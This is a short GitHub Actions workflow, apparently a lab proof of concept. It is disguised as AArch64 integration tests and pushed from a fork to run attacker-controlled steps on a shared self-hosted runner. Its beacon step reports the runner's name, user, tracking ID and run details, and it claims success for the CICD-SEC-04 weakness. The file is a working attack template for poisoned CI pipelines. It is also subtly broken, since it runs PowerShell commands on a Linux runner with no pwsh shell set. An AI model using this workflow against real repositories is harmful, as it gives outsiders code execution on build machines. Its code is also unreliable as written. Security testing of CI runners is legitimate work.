# POCON — Fork-controlled execution on a shared self-hosted runner (lab harness)
#
# This is the *attacker's* version of the workflow, pushed via a fork PR.
# On pull_request from the fork, GitHub runs the fork's workflow file — the
# exact mechanism exploited in the TensorFlow self-hosted runner disclosure.
# This beacon proves the code-execution primitive without persistence or exfil.

name: "Lab: AArch64 Linux LedBlinker (mirror)"

on:
  pull_request:
    branches: [devel, release/**]

permissions:
  contents: read

jobs:
  aarch64-integration:
    name: "AArch64 Linux Integration Tests"
    runs-on: [self-hosted, aarch64-linux]
    timeout-minutes: 5
    steps:
      - name: "POCON — fork-controlled code on shared self-hosted runner"
        run: |
          Write-Output "[POCON] event:          ${{ github.event_name }}"
          Write-Output "[POCON] head branch:    ${{ github.head_ref }}"
          Write-Output "[POCON] source repo:    ${{ github.repository }}"
          Write-Output "[POCON] run id:         ${{ github.run_id }}"
          Write-Output "[POCON] runner:         $env:COMPUTERNAME"
          Write-Output "[POCON] runner user:    $env:USERNAME"
          Write-Output "[POCON] RUNNER_TRACKING_ID: $env:RUNNER_TRACKING_ID"
          Write-Output "[POCON] timestamp:      $(Get-Date -Format o)"
          Write-Output ""
          Write-Output "[POCON] SUCCESS: Fork-controlled workflow executed arbitrary steps"
          Write-Output "[POCON] on a shared self-hosted runner - CICD-SEC-04 proven."